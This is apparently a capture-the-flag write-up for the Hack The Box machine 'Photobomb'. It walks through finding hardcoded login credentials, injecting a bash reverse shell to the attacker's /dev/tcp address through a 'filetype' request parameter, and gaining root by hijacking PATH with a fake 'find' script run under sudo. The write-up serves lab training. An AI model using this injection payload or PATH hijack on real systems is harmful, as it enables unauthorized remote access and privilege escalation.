# HTB - Photobomb

## Summary

I think this might be the easiest box there is. Hardcoded creds in the page source + a basic RCE vulnerability in a web request get us a reverse shell. The privesc is a basic PATH injection.

## Web Ex

Nmap shows port 80 is open with an http server running. The server has a login page. We can view page source (`ctrl + u`) and see the creds hardcoded.  

After logging in, we arrive at a photo downloading utility. We capture a download request in Burpsuite, and send it to repeater. The format of the request is:  
`photo=photo_name.png&filetype=png&dimensions=20x20`  
When we attempt to add `/` or `..` to the photo name field, to see if we can get LFI, it becomes clear that there is an LFI protection in place. This is apparent because the error message returned is different if there is one of these characters, vs if there is like an extra a or something to make the photo name wrong  

Playing around with the filetype field, we quickly find that adding a `;` causes a crash, and the server takes like 4 seconds to respond  
We attempt to execute a basic rev shell by putting:  
`png;bash -c 'bash -i >& /dev/tcp/<tun 0 ip>/8687 0>&1';`  
in the filetype field  

We should URL encode that in burp by highlighting and pressing `ctrl + u`  and then start a nc listener on 8687 and we get a connection  

Upgrade our shell with:  
`python3 -c 'import pty;pty.spawn("/bin/bash")'`  
`ctrl + z`  
`stty raw -echo; fg`  
`export TERM=xterm`  

## Privesc

`sudo -l`  shows:  
```txt
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin:/usr/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
So this means that we can run `/opt/cleanup.sh` with sudo  
Notably, env_reset is set, meaning our environment variables will not carry over when we run sudo. However, SETENV is also set on the `/opt/cleanup.sh` line, meaning we can set environment variables when we run `/opt/cleanup.sh` with sudo. This presents an easy path injection opportunity  

Looking at `/opt/cleanup.sh` we can see it calls `find`  
We create a new find in /tmp and add:  
`#!/bin/bash`  
`bash`  
to it and chmod +x it  

Then, run:  
`sudo PATH=/tmp:$PATH /opt/cleanup.sh`  
and we get a shell as root easy pz  
